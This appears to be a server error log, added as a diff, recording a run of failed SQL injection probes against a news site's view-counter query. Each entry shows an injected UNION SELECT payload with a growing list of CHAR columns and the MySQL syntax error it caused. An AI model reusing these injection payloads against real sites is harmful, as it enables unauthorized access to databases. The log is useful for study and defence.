+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by ' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by 'as /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111' UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by 'as /*
+
+Time : 10:29:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) --  /*
+
+Time : 10:29:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) --  /*
+
+Time : 10:29:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) --  /*
+
+Time : 10:29:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) --  /*
+
+Time : 10:29:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) --  /*
+
+Time : 10:29:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) --  /*
+
+Time : 10:29:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) --  /*
+
+Time : 10:29:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) --  /*
+
+Time : 10:29:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) --  /*
+
+Time : 10:29:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) --  /*
+
+Time : 10:29:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) --  /*
+
+Time : 10:29:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) --  /*
+
+Time : 10:29:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) --  /*
+
+Time : 10:29:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) --  /*
+
+Time : 10:29:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) --  /*
+
+Time : 10:29:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) --  /*
+
+Time : 10:29:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) --  /*
+
+Time : 10:29:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) --  /*
+
+Time : 10:29:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) --  /*
+
+Time : 10:29:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) --  /*
+
+Time : 10:29:20
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) --  /*
+
+Time : 10:29:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) --  /*
+
+Time : 10:29:19
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=63841111111111111 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) --  /*
+
+Time : 10:29:18
